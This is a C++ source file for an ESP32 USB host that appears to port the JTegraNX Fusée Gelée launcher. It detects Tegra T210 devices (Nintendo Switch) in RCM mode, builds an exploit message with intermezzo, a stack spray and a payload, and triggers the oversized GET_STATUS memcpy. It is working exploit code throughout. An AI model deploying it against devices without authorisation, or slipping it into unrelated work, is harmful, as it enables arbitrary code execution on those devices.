#include "RCM.h"
#include <EspUsbHost.h>
#include <algorithm>

class RCM RCM;

//endianness conversion helper
std::array<uint8_t, 4> RCM::to_bytes(uint32_t value) {
    return {
        static_cast<uint8_t>(value & 0xFF),
        static_cast<uint8_t>((value >> 8) & 0xFF),
        static_cast<uint8_t>((value >> 16) & 0xFF),
        static_cast<uint8_t>((value >> 24) & 0xFF)
    };
}

//USB Setup
bool RCM::begin() {
    espusbHost.onDeviceConnected([this](const EspUsbHostDeviceInfo &device) {
        if (device.vid != NVIDIA_VID) {
            return;
        }
        for (uint16_t expectedPid : T210_PIDS) {
            if (device.pid == expectedPid) {
                device_address = device.address;
                Serial0.printf("RCM device detected: VID=%04X PID=%04X address=%u\r\n",
                               device.vid, device.pid, device.address);
                device_found   = true;   // just set the flag here, nothing blocking
                return;
            }
        }
    });

    if (!espusbHost.begin()) {
        Serial0.println("EspUsbHost begin failed");
        return false;
    }
    return true;
}

//Detects vulnerable Switches in RCM mode and opens the vendor interface for writing
void RCM::detect_device() {

    Serial0.println("Waiting for RCM device...");
    while (!device_found) {
        delay(10);   // yields to the USB background task; avoid a tight spin
    }

    // We're on the calling task here, not inside onDeviceConnected(),
    // so it's safe to perform the blocking vendorOpen() call now.
    if (espusbHost.vendorOpen(device_address)) {
        vendor_opened = true;
        Serial0.printf("RCM device opened at address %u\r\n", device_address);
    } else {
        Serial0.println("vendorOpen failed");
    }
}


//Patcher ported over from JTegraNX
std::vector<uint8_t> RCM::create_rcm_message(const std::vector<uint8_t> &payload) {
    if (payload.empty()) {
        Serial0.println("Specified payload is empty");
        return {};
    }

    if (payload.size() > kMaxPayloadSize || payload.size() < kMinPayloadSize) {
        Serial0.printf("Invalid payload file size: %u bytes\r\n",
                       static_cast<unsigned>(payload.size()));
        return {};
    }

    size_t totalSize = kPayloadPart1Offset + payload.size() + (kSpreadCount * 4);

    // Pad up to next 0x1000-byte boundary
    const size_t remainder = totalSize % USB_XFER_MAX;
    if (remainder != 0) {
        totalSize += (USB_XFER_MAX - remainder);
    }

    // Ensure an odd number of 0x1000-byte chunks so buffer-toggle parity matches
    if (((totalSize / USB_XFER_MAX) % 2) == 0) {
        totalSize += USB_XFER_MAX;
    }

    if (totalSize > kMaxTotalSize) {
        Serial0.printf("Payload size is too big (total=0x%X)\r\n",
                       static_cast<unsigned>(totalSize));
        return {};
    }

    Serial0.println("Creating RCM payload");

    std::vector<uint8_t> message(totalSize, 0x00);

    // Header length prefix (little-endian) at start of message
    const uintptr_t rcmPayloadLength =
        (IRAM_END - RCM_PAYLOAD_ADDR) + HEADER_SIZE - 16;
    const auto headerLengthBytes = to_bytes(static_cast<uint32_t>(rcmPayloadLength));
    std::copy(headerLengthBytes.begin(), headerLengthBytes.end(), message.begin() + kInitOffset);

    // Intermezzo at offset 0x2a8 (clamped to available INTERMEZZO_BIN size)
    if (!INTERMEZZO_BIN.empty() && kIntermezzoOffset < message.size()) {
        const size_t intermezzoCopyLen =
            std::min(INTERMEZZO_BIN.size(), message.size() - kIntermezzoOffset);
        std::copy(INTERMEZZO_BIN.begin(),
                  INTERMEZZO_BIN.begin() + intermezzoCopyLen,
                  message.begin() + kIntermezzoOffset);
    }

    // First 0x4000 bytes of payload at 0x10e8
    std::copy(payload.begin(),
              payload.begin() + kMinPayloadSize,
              message.begin() + kPayloadPart1Offset);

    // Stack spray pattern (0x870 * 4 bytes = 0x21c0 bytes) starting at 0x50e8
    const auto spreadBytes = to_bytes(static_cast<uint32_t>(RCM_PAYLOAD_ADDR));
    for (size_t i = 0; i < kSpreadCount; ++i) {
        std::copy(spreadBytes.begin(),
                  spreadBytes.end(),
                  message.begin() + kSpreadOffset + (i * 4));
    }

    // Remaining payload bytes starting at 0x72a8
    const size_t part2Size = payload.size() - kMinPayloadSize;
    std::copy(payload.begin() + kMinPayloadSize,
              payload.end(),
              message.begin() + kPayloadPart2Offset);

    Serial0.printf("RCM message size: %u bytes (%u x 0x%X blocks)\r\n",
                   static_cast<unsigned>(message.size()),
                   static_cast<unsigned>(message.size() / USB_XFER_MAX),
                   static_cast<unsigned>(USB_XFER_MAX));
    return message;
}


/**
 * Writes data to the main RCM protocol endpoint, splitting it into
 * USB_XFER_MAX-sized chunks.
 */
bool RCM::write(const std::vector<uint8_t> &data) {
    size_t length = data.size();
    size_t offset = 0;

    while (length) {
        size_t data_to_transmit = std::min(length, USB_XFER_MAX);
        length -= data_to_transmit;

        std::vector<uint8_t> chunk(data.begin() + offset,
                                    data.begin() + offset + data_to_transmit);
        offset += data_to_transmit;

        if (!write_single_buffer(chunk)) {
            Serial0.println("RCM buffer write failed");
            return false;
        }
    }

    //mostly not required but also not currently functional
    /*if ((data.size() % USB_XFER_MAX) == 0) {
        if (!write_single_buffer(std::vector<uint8_t>())) {
            Serial0.println("RCM buffer write failed (ZLP)");
            return false;
        }
    }*/
    return true;
}

bool RCM::write_single_buffer(const std::vector<uint8_t> &data) {
    toggle_buffer();

    bool ok = espusbHost.vendorWrite(data.data(), data.size());
    if (!ok) {
        return false;
    }


    return true;
}

void RCM::toggle_buffer() {
    current_buffer = 1 - current_buffer;
}

uintptr_t RCM::get_current_buffer_address() const {
    return COPY_BUFFER_ADDRESSES[current_buffer];
}

bool RCM::switch_to_highbuf() {
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1]) {
        if (!write(std::vector<uint8_t>(USB_XFER_MAX, 0))) {
            return false;
        }
    }
    return true;
}

bool RCM::trigger_controlled_memcpy() {
    std::vector<uint8_t> buffer(28672);
    size_t actualLength = 0;

    bool fail = espusbHost.vendorControlTransfer(
        STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT,  // requestType (bmRequestType)
        GET_STATUS,                                    // request
        0,                                              // wValue
        0,                                              // wIndex
        buffer.data(),
        buffer.size(),
        &actualLength,
        device_address,
        1000                                            // timeoutMs, matches the Java call
    );

    if (fail) {
        return false;
    }
    return true;
}


